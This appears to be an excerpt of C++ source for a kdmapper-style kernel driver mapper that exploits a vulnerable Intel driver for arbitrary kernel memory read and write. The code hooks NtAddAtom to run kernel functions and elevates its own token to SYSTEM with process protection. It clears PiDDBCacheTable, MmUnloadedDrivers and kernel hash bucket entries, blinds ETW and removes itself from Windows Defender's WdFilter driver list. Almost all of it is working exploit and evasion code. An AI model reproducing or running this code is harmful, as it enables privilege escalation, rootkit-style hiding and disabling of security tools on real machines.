...
namespace intel_driver {
  ...
  PiDDBCacheEntry* LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable,
                               ULONG timestamp, const wchar_t* name);
  PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction,
                               _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

  uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen,
                                BYTE* bMask, const char* szMask);
  uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr,
                                PULONG size);
  uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName,
                                         uintptr_t modulePtr, BYTE* bMask, const char* szMask);
  ...
  bool CheckForIATHooks(HANDLE device_handle, uint64_t driver_object, uint64_t ntoskrnl_base,
  ...
  PVOID FindUnusedSpace(HANDLE device_handle, uintptr_t base, unsigned long section_size,
                        size_t required_size, size_t chunk_size = 0x10000);
  ...
  BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size,
                              ULONG new_protect);

  /**/

  bool FreePool(HANDLE device_handle, uint64_t address);
  uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base,
  ...
  __forceinline bool CallKernelFunction(HANDLE device_handle, T* out_result,
    ...
    *(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
    ...
    static uint64_t kernel_NtAddAtom =
        GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("NtAddAtom"));
    if (!kernel_NtAddAtom) {
    ...
    if (original_kernel_function[0] == kernel_injected_jmp[0] &&
      ...
      Log(L"[-] FAILED!: The code was already hooked!! another instance of "
          L"kdmapper running?!"
          << std::endl);
      return false;
    }
    ...
    if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp,
                               sizeof(kernel_injected_jmp)))
      return false;
    ...
    return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function,
                                 sizeof(kernel_injected_jmp));
  }
}  // namespace intel_driver
...
inline bool RegisterAndStart(const std::wstring& driver_path) {
  ...
  HKEY dservice;
  LSTATUS status = shadowcall<LSTATUS>("RegCreateKeyW", HKEY_LOCAL_MACHINE, servicesPath.c_str(),
  ...
  status = shadowcall<LSTATUS>("RegSetKeyValueW", dservice, NULL, (L"ImagePath"), REG_EXPAND_SZ,
  ...
  status = shadowcall<LSTATUS>("RegSetKeyValueW", dservice, NULL, (L"Type"), REG_DWORD,
  ...
  NTSTATUS Status = shadowcall<NTSTATUS>("RtlAdjustPrivilege", SE_LOAD_DRIVER_PRIVILEGE, TRUE,
                                         FALSE, &SeLoadDriverWasEnabled);
  if (!NT_SUCCESS(Status)) {
    Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure "
...
bool StopAndRemove(const std::wstring& driver_name) {
  ...
  LSTATUS status =
      shadowcall<LSTATUS>("RegOpenKeyW", HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
  if (status != ERROR_SUCCESS) {
  ...
  auto st = NtUnloadDriver(&serviceStr);
...
bool intel_driver::IsRunning() {
  ...
  auto status = NtCreateFile(&fileHandle, FILE_ANY_ACCESS, &objAttr, &ioStatusBlock, NULL,
...
HANDLE intel_driver::Load() {
  ...
  // from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes
  // same device name
  ...
  auto status = NtCreateFile(&result, GENERIC_READ | GENERIC_WRITE, &objAttr, &ioStatusBlock, NULL,
  ...
  if (!intel_driver::ReadMemory(result, intel_driver::ntoskrnlAddr, &dosHeader,
    ...
    Log(L"[-] Can't exploit intel driver, is there any antivirus or anticheat "
        L"running?"
        << std::endl);
    intel_driver::Unload(result);
    return INVALID_HANDLE_VALUE;
...
bool intel_driver::NullEtwpBootPhase(HANDLE device_handle) {
  ...
  if (!kernel_EtwpBootPhase) {
    kernel_EtwpBootPhase = intel_driver::FindPatternInSectionAtKernel(
        device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\x44\x38\x05\x00\x00\x00\x00\x48\x8D\x9F\x00\x00\x00\x00\x0F"
                "\x10\x45\xC7"),
        (char*)("xxx????xxx????xxxx"));
    if (!kernel_EtwpBootPhase) {
      ...
      kernel_EtwpBootPhase = intel_driver::FindPatternInSectionAtKernel(
          device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr,
          (BYTE*)("\x44\x39\x3D\x00\x00\x00\x00\x41\xBC\x00\x00\x00\x00\x74\x23"
                  "\x44\x89\x4C\x24\x00\x48\x8B\xD7"),  // 44 39 3D ? ? ? ? 41
          // BC ? ? ? ? 74 23 44
          // 89 4C 24 ? 48 8B D7
          // EtwpFileSystemReady
    ...
    kernel_EtwpBootPhase =
        (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_EtwpBootPhase, 3, 7);
    if (!kernel_EtwpBootPhase) {
      Log(L"[!] Failed to resolve relative address "
          L"EtwpBootPhase/EtwpFileSystemReady"
          << std::endl);
      return false;
    }
  }
...
__forceinline bool intel_driver::ProtectProcess(HANDLE device_handle) {
  static uint64_t kernel_PsGetCurrentProcess =
      GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("IoGetCurrentProcess"));
  ...
  if (!ReadMemory(device_handle, current_eprocess_address + 0x87a, &ps_protection,
  ...
  if (!WriteMemory(device_handle, current_eprocess_address + 0x87a, &ps_protection,
                   sizeof(ps_protection))) {
...
__forceinline bool intel_driver::ElevateTokenToSystemAndProtect(HANDLE device_handle) {
  ...
  static uint64_t kernel_PsInitialSystemProcess =
      GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "PsInitialSystemProcess");
  ...
  if (!ReadMemory(device_handle, kernel_PsInitialSystemProcess, &system_eprocess_address,
                  sizeof(system_eprocess_address))) {
  ...
  nt::_PS_PROTECTION ps_protection = {};
  // if (!ReadMemory(device_handle, system_eprocess_address + 0x87a,
  // &ps_protection, sizeof(ps_protection))) { 	Log(L"[!] Failed to find SYSTEM
  //_PS_PROTECTION" << std::endl); 	return false;
  // }
...
__forceinline bool intel_driver::IsAddressInModule(uint64_t address, uint64_t module_base,
                                                   uint64_t module_size) {
  return address >= module_base && address < (module_base + module_size);
}

__forceinline bool intel_driver::CheckForIATHooks(HANDLE device_handle, uint64_t driver_object,
                                                  uint64_t ntoskrnl_base, uint64_t ntoskrnl_size) {
  uint64_t driver_start = 0;
  if (!ReadMemory(device_handle, driver_object + 0x18, &driver_start, sizeof(driver_start)) ||
      !driver_start) {
  ...
  if (!ReadMemory(device_handle, driver_start, &dos_header, sizeof(dos_header)) ||
  ...
  if (!ReadMemory(device_handle, driver_start + dos_header.e_lfanew, &nt_headers,
                  sizeof(nt_headers)) ||
  ...
  for (size_t i = 0; i < iat_size / sizeof(uint64_t); ++i) {
    ...
    if (!ReadMemory(device_handle, iat_start + i * sizeof(uint64_t), &function_ptr,
                    sizeof(function_ptr))) {
    ...
    if (!IsAddressInModule(function_ptr, ntoskrnl_base, ntoskrnl_size)) {
      Log(L"[!] Suspicious IAT entry found at index " << i << " with address: " << std::hex
                                                      << function_ptr << std::endl);
      return true;
    }
  }
...
std::wstring intel_driver::IdentifyHookingDriver(uint64_t address) {
  ...
  ULONG buffer_size = 0;
  auto status =
      NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation),
  ...
  for (unsigned int i = 0; i < modules->NumberOfModules; ++i) {
    ...
    if (address >= module_base && address < module_base + module_size) {
      ...
      std::string module_name(reinterpret_cast<char*>(module.FullPathName) +
...
__forceinline int intel_driver::CheckForDriverDispatchHook(HANDLE device_handle) {
  ...
  auto status = NtQuerySystemInformation(
      static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer,
      buffer_size, &buffer_size);

  while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
    if (buffer) {
      SIZE_T free_size = 0;
      auto free_status = NtFreeVirtualMemory(NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
  ...
  for (auto i = 0u; i < system_handle_information->HandleCount; ++i) {
    ...
    if (current_system_handle.UniqueProcessId !=
        reinterpret_cast<HANDLE>(static_cast<uint64_t>(current_pid)))
      continue;
  ...
  if (!ReadMemory(device_handle, driver_object + 0x70 + (14 * sizeof(void*)), &major_function_idx14,
                  sizeof(major_function_idx14)) ||
      !major_function_idx14) {
  ...
  if (!ReadMemory(device_handle, driver_object + 0x20, &driver_size, sizeof(driver_size)) ||
      !driver_size) {
  ...
  if (major_function_idx14 >= driver_start && major_function_idx14 < driver_end) {
    ...
    Log(L"[!] Driver Dispatch is NOT within the driver's address range, "
        L"kdstinker found"
        << std::endl);
    ret = 2;
  }
  ...
  IMAGE_NT_HEADERS nt_headers = {0};
  if (!ReadMemory(device_handle, nt_headers_address, &nt_headers, sizeof(nt_headers)) ||
      nt_headers.Signature != IMAGE_NT_SIGNATURE) {
    Log(L"[!] Failed to read NT headers or invalid NT signature" << std::endl);
    return false;
  }
  ...
  if (!ReadMemory(device_handle,
                  nt_headers_address + offsetof(IMAGE_NT_HEADERS, OptionalHeader) +
                      ...
                      IMAGE_DIRECTORY_ENTRY_IAT * sizeof(IMAGE_DATA_DIRECTORY),
  ...
  std::unordered_map<uint64_t, std::pair<std::wstring, std::string>>
      valid_exports;  // address -> (module_name, function_name)

  auto add_module_exports = [&](uint64_t base, const std::wstring& module_name) -> bool {
    IMAGE_DOS_HEADER dos_header = {0};
    if (!ReadMemory(device_handle, base, &dos_header, sizeof(dos_header)) ||
        dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
    ...
    if (!ReadMemory(device_handle, base + export_dir.AddressOfFunctions, functions.data(),
    ...
    if (!ReadMemory(device_handle, base + export_dir.AddressOfNameOrdinals, ordinals.data(),
    ...
    if (!ReadMemory(device_handle, base + export_dir.AddressOfNames, name_rvas.data(),
  ...
  for (size_t i = 0; i < iat_size / sizeof(uint64_t); ++i) {
    ...
    if (it == valid_exports.end()) {
      Log(L"[!] Hooked IAT entry found at index "
          << i << " with address: 0x" << std::hex << function_ptr
      ...
      Log(L"[+] Verified IAT entry at index " << i << " from " << module_name << L": "
                                              << std::wstring(func_name.begin(), func_name.end())
                                              << L" (0x" << std::hex << function_ptr << L")"
                                              << std::endl);
    }
  }
...
__forceinline bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
  ...
  auto RuntimeDriversList =
      FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter,
                                   (PUCHAR)("\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05"), ("xxx????xx"));
  if (!RuntimeDriversList) {
    Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
    return false;
  }

  auto RuntimeDriversCountRef =
      FindPatternInSectionAtKernel(device_handle, ("PAGE"), WdFilter,
                                   (PUCHAR)("\xFF\x05\x00\x00\x00\x00\x48\x39\x11"), ("xx????xxx"));
  ...
  */
  auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(
      device_handle, ("PAGE"), WdFilter,
      (PUCHAR)("\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00"
               "\x00\x00\x00\x00\xE9"),
      ("xxx?x?xx???????????x"));
  if (!MpFreeDriverInfoExRef) {
    ...
    */
    MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(
        device_handle, ("PAGE"), WdFilter,
        (PUCHAR)("\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00"
                 "\x00\x00\x00\x00\xE9"),
        ("xxx?xx?x???????????x"));
    if (!MpFreeDriverInfoExRef) {
  ...
  RuntimeDriversList =
      (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
  uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
  uintptr_t RuntimeDriversCount =
      (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
  ...
  uintptr_t MpFreeDriverInfoEx =
      (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);

  auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {  // Usefull lambda to read LIST_ENTRY
    LIST_ENTRY* Entry;
    if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*)))
      return 0;
    return Entry;
  };
  ...
  for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
    ...
    if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String,
                   sizeof(UNICODE_STRING))) {
      auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
      if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(),
        ...
        if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
          ...
          for (int k = 0; k < 256; k++) {  // max RuntimeDriversArray elements
            ...
            if (value == SameIndexList) {
              PVOID emptyval = (PVOID)(RuntimeDriversCount +
                                       1);  // this is not count+1 is position of cout addr+1
          ...
          WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)),
                      &PrevEntry, sizeof(LIST_ENTRY::Blink));
          WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)),
                      &NextEntry, sizeof(LIST_ENTRY::Flink));
          ...
          if (Magic != 0xDA18) {
            Log("[!] DriverInfo Magic is invalid, new wdfilter version?, "
                "driver info will not be released to prevent bsod"
                << std::endl);
          } else {
...
bool CheckContiguousZeros(HANDLE device_handle, uintptr_t start_addr, size_t required_size) {
  ...
  for (size_t offset = 0; offset < required_size; offset += check_chunk_size) {
    ...
    if (!intel_driver::ReadMemory(device_handle, start_addr + offset, check_buffer.data(),
                                  check_size)) {
      return false;
    }
...
PVOID intel_driver::FindUnusedSpace(HANDLE device_handle, uintptr_t base,
                                    unsigned long section_size, size_t required_size,
                                    size_t chunk_size) {
  Log(L"[+] Searching for " << required_size << L" bytes in section of size " << section_size
                            << std::endl);
  ...
  for (unsigned long i = 0; i <= max_offset; i += safe_chunk_size) {
    ...
    // only check positions where we can fit the required size within remaining
    // section
...
bool intel_driver::Unload(HANDLE device_handle) {
  ...
  int newFileLen = sizeof(intel_driver_resource::driver) +
  ...
  if (!file_ofstream.write((char*)randomData, newFileLen)) {
    Log(L"[!] Error dumping inside the disk" << std::endl);
  } else {
...
__forceinline bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination,
  ...
  NTSTATUS status = NtDeviceIoControlFile(device_handle,               // FileHandle
                                          nullptr,                     // Event
                                          nullptr,                     // ApcRoutine
                                          nullptr,                     // ApcContext
                                          &io_status_block,            // IoStatusBlock
...
bool intel_driver::DumpMiPinDriverAddressLog(HANDLE device_handle) {
  ...
  // resolve address
  uint64_t MiPinDriverAddressLog_ptr =
      (uint64_t)intel_driver::ResolveRelativeAddress(device_handle, (PVOID)pattern_address, 3, 7);
...
__forceinline bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address,
...
__forceinline uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address,
                                                uint32_t size) {
...
__forceinline bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address,
                                              uint32_t size) {
  if (!address || !size)
    return false;
...
__forceinline bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer,
                                            uint64_t size) {
  return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

__forceinline bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer,
                                             uint64_t size) {
  return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

__forceinline bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address,
  ...
  if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
    Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address)
                                                      << std::endl);
    return false;
  }
  ...
  if (!mapped_physical_memory) {
    Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address)
                                            << std::endl);
    return false;
  }
  ...
  if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
    Log(L"[!] Failed to unmap IO space of physical address 0x"
        << reinterpret_cast<void*>(physical_address) << std::endl);
#endif

  return result;
}

__forceinline uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle,
                                                                  uint32_t size) {
  ...
  if (!kernel_MmAllocateIndependentPagesEx) {
    kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(
        device_handle, (char*)(".text"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\xE8\x00\x00\x00\x00\x48\x89\x05\x00\x00\x00\x00\x48\x85"
                "\xC0\x74\x0D\x4C\x8B"),
        (char*)("x????xxx????xxxxxxx"));
    if (!kernel_MmAllocateIndependentPagesEx) {
      kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(
          device_handle, (char*)("PAGE"),
          intel_driver::ntoskrnlAddr,  // 24h2 26100.3xxx
          (BYTE*)("\xE8\x00\x00\x00\x00\x48\x8B\xD8\x48\x85\xC0\x74\x00\x48"
                  "\x8B\x0D"),
          (char*)("x????xxxxxxx?xxx"));
      if (!kernel_MmAllocateIndependentPagesEx) {
    ...
    kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(
        device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
    if (!kernel_MmAllocateIndependentPagesEx) {
      Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
      return 0;
    }
  ...
  if (!intel_driver::CallKernelFunction(device_handle, &allocated_pages,
                                        kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
    return 0;

  return allocated_pages;
}

__forceinline uint64_t intel_driver::MmRemovePhysicalMemory(HANDLE device_handle, uint64_t address,
                                                            size_t size) {
  NTSTATUS status;
  ...
  if (!kernel_MmRemovePhysicalMemory) {
    kernel_MmRemovePhysicalMemory = intel_driver::FindPatternInSectionAtKernel(
        device_handle, (char*)("PAGE"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\xE8\x00\x00\x00\x00\x85\xC0\x79\x0A\xBB\x00\x00\x00\x00\xE9"
                "\x00\x00\x00\x00\x48\x8B\x0F"),
        (char*)("x????xxxxx????x????xxx"));
    if (!kernel_MmRemovePhysicalMemory) {
    ...
    // kernel_MmAllocateIndependentPagesEx =
    // (uint64_t)ResolveRelativeAddress(device_handle,
    // (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5); if
    // (!kernel_MmAllocateIndependentPagesEx) { 	Log(L"[!] Failed to find
    // MmAllocateIndependentPagesEx" << std::endl); 	return 0;
    // }
  }

  if (!intel_driver::CallKernelFunction(device_handle, &status, kernel_MmRemovePhysicalMemory,
                                        address, size))
    return 0;
...
__forceinline uint64_t intel_driver::MiGetPteAddress(HANDLE device_handle, uint64_t address) {
  ...
  if (!kernel_MiGetPteAddress) {
    kernel_MiGetPteAddress = intel_driver::FindPatternInSectionAtKernel(
        device_handle, (char*)(".text"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\x48\xC1\xE9\x09\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x48"
                "\x23\xC8\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00\x48\x03\xC1"
                "\xC3"),
...
__forceinline uint64_t intel_driver::MiGetPdeAddress(HANDLE device_handle, uint64_t address) {
  ...
  if (!kernel_MiGetPdeAddress) {
    kernel_MiGetPdeAddress = intel_driver::FindPatternInSectionAtKernel(
        device_handle, (char*)(".text"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\x48\xC1\xE9\x12\x81\xE1\x00\x00\x00\x00\x48\xB8\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x48\x03\xC1\xC3"),
        (char*)("xxxxxx????xx????????xxxx"));
    if (!kernel_MiGetPdeAddress) {
...
__forceinline bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address,
                                                        uint32_t size) {
  static uint64_t kernel_MmFreeIndependentPages = 0;

  if (!kernel_MmFreeIndependentPages) {
    kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(
        device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\x00\x00\x00\xE8\x00\x00"
                "\x00\x00\x48\x8B\xD0\x48\x8D\x0D\x00\x00\x00\x00"),
        (char*)("x????xxx????x????xxxxxx????"));
    if (!kernel_MmFreeIndependentPages) {
    ...
    kernel_MmFreeIndependentPages =
        (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmFreeIndependentPages, 1, 5);
    if (!kernel_MmFreeIndependentPages) {
      Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
      return false;
    }
  ...
  uint64_t result{};
  return intel_driver::CallKernelFunction(device_handle, &result, kernel_MmFreeIndependentPages,
                                          address, size);
}

__forceinline BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address,
  ...
  if (!kernel_MmSetPageProtection) {
    kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(
        device_handle, (".text"), intel_driver::ntoskrnlAddr,
        (BYTE*)("\xE8\x00\x00\x00\x00\x48\x83\x67\x00\x00\x48\x8B\x5C\x24\x00"
                "\x48\x89\x77\x20\x48\x8B\x74\x24\x00\x48\x83\xC4\x20\x5F\xC3"),
    ...
    kernel_MmSetPageProtection =
        (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmSetPageProtection, 1, 5);
    if (!kernel_MmSetPageProtection) {
      Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
      return FALSE;
    }
  ...
  if (!intel_driver::CallKernelFunction(device_handle, &set_prot_status, kernel_MmSetPageProtection,
...
__forceinline bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
  ...
  static uint64_t kernel_ExFreePool =
      GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("ExFreePool"));
...
inline uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle,
  ...
  if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) ||
      dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
      !ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers,
                  sizeof(nt_headers)) ||
      nt_headers.Signature != IMAGE_NT_SIGNATURE)
    return 0;
...
__forceinline int intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
  ...
  if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name,
  ...
  auto unloadedName =
      std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
  ...
  us_driver_base_dll_name.Length =
      0;  // MiRememberUnloadedDriver will check if the length > 0 to save the
  // unloaded driver
...
inline PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction,
...
inline bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource,
                                                         BOOLEAN wait) {
  if (!Resource)
    return 0;

  static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(
      device_handle, intel_driver::ntoskrnlAddr, ("ExAcquireResourceExclusiveLite"));
  ...
  return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource,
                             wait) &&
          out);
}
...
inline BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table,
                                                             PVOID Buffer) {
  if (!Table)
    return false;

  static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(
      device_handle, intel_driver::ntoskrnlAddr, ("RtlDeleteElementGenericTableAvl"));
  ...
  bool out;
  return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table,
                             Buffer) &&
          out);
}

inline PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle,
                                                           PRTL_AVL_TABLE Table, PVOID Buffer) {
  if (!Table)
    return nullptr;

  static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(
      device_handle, intel_driver::ntoskrnlAddr, ("RtlLookupElementGenericTableAvl"));
  ...
  if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table,
                          Buffer))
    return 0;
...
inline intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle,
  ...
  return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable,
                                                           (PVOID)&localentry);
}

inline bool
intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) {  // PiDDBCacheTable added on LoadDriver

  PRTL_AVL_TABLE PiDDBCacheTable = nullptr;
  PiDDBLockPtr = FindPatternInSectionAtKernel(
      device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
      (PUCHAR)("\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25"
               "\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D"
               "\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24"),
      ("xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"));

  PiDDBCacheTablePtr =
      FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
  ...
  if (PiDDBLockPtr == NULL) {
    ...
    PiDDBLockPtr = FindPatternInSectionAtKernel(
        device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
        (PUCHAR)("\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00"
                 "\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8"),
        ("xxx????xxxxx????xxx????x????x"));
    ...
    if (PiDDBLockPtr == NULL) {
      ...
      PiDDBLockPtr = FindPatternInSectionAtKernel(
          device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
          (PUCHAR)("\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04"
                   "\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01"
                   "\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C"),
          ("xxxxxx????xxxxx????xxx????xxxxx????xx????x"));

      PiDDBCacheTablePtr = FindPatternInSectionAtKernel(
          device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
          (PUCHAR)("\x66\x00\x44\x24\x00\x48\x8D\x0D\x00\x00\x00\x00\x66"), ("x?xx?xxx????x"));
      PiDDBCacheTablePtr += 5;
      PiDDBCacheTable =
          (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 3, 7);
      if (PiDDBLockPtr == NULL) {
  ...
  PLIST_ENTRY prev;
  if (!ReadMemory(device_handle,
                  (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev,
                  sizeof(_LIST_ENTRY*))) {
  ...
  PLIST_ENTRY next;
  if (!ReadMemory(device_handle,
                  (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next,
                  sizeof(_LIST_ENTRY*))) {
...
inline uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress,
                                                   uintptr_t dwLen, BYTE* bMask,
                                                   const char* szMask) {
  if (!dwAddress) {
...
inline uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, const char* sectionName,
                                                   uintptr_t modulePtr, PULONG size) {
  if (!modulePtr)
    return 0;
  BYTE headers[0x1000];
...
inline uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle,
                                                            const char* sectionName,
                                                            uintptr_t modulePtr, BYTE* bMask,
                                                            const char* szMask) {
  ULONG sectionSize = 0;
...
inline bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
  ...
  auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR(("\x48\x8D\x0D")),
                                  ("xxx"));
  if (!sig2) {
  ...
  while (entry) {
    USHORT wsNameLen = 0;
    if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length),
                    &wsNameLen, sizeof(wsNameLen)) ||
        wsNameLen == 0) {
    ...
    if (expected_len == wsNameLen) {
      wchar_t* wsNamePtr = 0;
      if (!ReadMemory(device_handle,
                      (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr,
                      sizeof(wsNamePtr)) ||
          !wsNamePtr) {
      ...
      if (find_result != std::wstring::npos) {
        Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result])
                                                     << std::endl);
